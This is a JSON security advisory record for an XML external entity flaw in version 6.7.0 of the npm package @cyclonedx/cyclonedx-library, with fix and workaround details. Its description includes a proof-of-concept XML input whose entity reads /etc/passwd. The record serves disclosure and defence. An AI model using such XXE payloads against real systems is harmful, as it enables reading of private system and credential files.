{
  "Severity": "HIGH",
  "UpdatedAt": "2024-05-08T19:55:37Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "@cyclonedx/cyclonedx-library"
  },
  "Advisory": {
    "DatabaseId": 245255,
    "Id": "GSA_kwCzR0hTQS0zOGdmLXJoMnctZ21qN84AA74H",
    "GhsaId": "GHSA-38gf-rh2w-gmj7",
    "References": [
      {
        "Url": "https://github.com/CycloneDX/cyclonedx-javascript-library/security/advisories/GHSA-38gf-rh2w-gmj7"
      },
      {
        "Url": "https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063"
      },
      {
        "Url": "https://github.com/CycloneDX/cyclonedx-javascript-library/commit/5e5e1e0b9422f47d2de81c7c4064b803a01e7203"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-34345"
      },
      {
        "Url": "https://github.com/advisories/GHSA-38gf-rh2w-gmj7"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-38gf-rh2w-gmj7"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-34345"
      }
    ],
    "Description": "### Impact\n\nXML External entity injections could be possible, when running the provided XML Validator on arbitrary input.\n\n#### POC\n\n```js\nconst {\n  Spec: { Version },\n  Validation: { XmlValidator }\n} = require('@cyclonedx/cyclonedx-library');\n\nconst version = Version.v1dot5;\nconst validator = new XmlValidator(version);\nconst input = `\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE poc [\n  \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e\n]\u003e\n\u003cbom xmlns=\"http://cyclonedx.org/schema/bom/1.5\"\u003e\n  \u003ccomponents\u003e\n    \u003ccomponent type=\"library\"\u003e\n      \u003cname\u003etesting\u003c/name\u003e\n      \u003cversion\u003e1.337\u003c/version\u003e\n      \u003clicenses\u003e\n        \u003clicense\u003e\n          \u003cid\u003e\u0026xxe;\u003c/id\u003e\u003c!-- \u003c\u003c XML external entity (XXE) injection --\u003e\n        \u003c/license\u003e\n      \u003c/licenses\u003e\n    \u003c/component\u003e\n  \u003c/components\u003e\n\u003c/bom\u003e`;\n\n// validating this forged(^) input might lead to unintended behaviour\n// for the fact that the XML external entity would be taken into account.\nvalidator.validate(input).then(ve =\u003e {\n  console.error('validation error', ve);\n});\n```\n\n### Patches\n\nThis issue was fixed in `@cyclonedx/cyclonedx-library@6.7.1 `.\n\n\n\n### Workarounds\n\nDo not run the provided XML validator on untrusted inputs.\n\n### References\n\n* issue was introduced via \u003chttps://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063\u003e.  \n",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-05-08T19:55:37Z",
    "Severity": "HIGH",
    "Summary": "@cyclonedx/cyclonedx-library Improper Restriction of XML External Entity Reference vulnerability",
    "UpdatedAt": "2024-05-14T20:01:49Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.1,
      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "6.7.1"
      },
      "VulnerableVersionRange": "= 6.7.0"
    }
  ]
}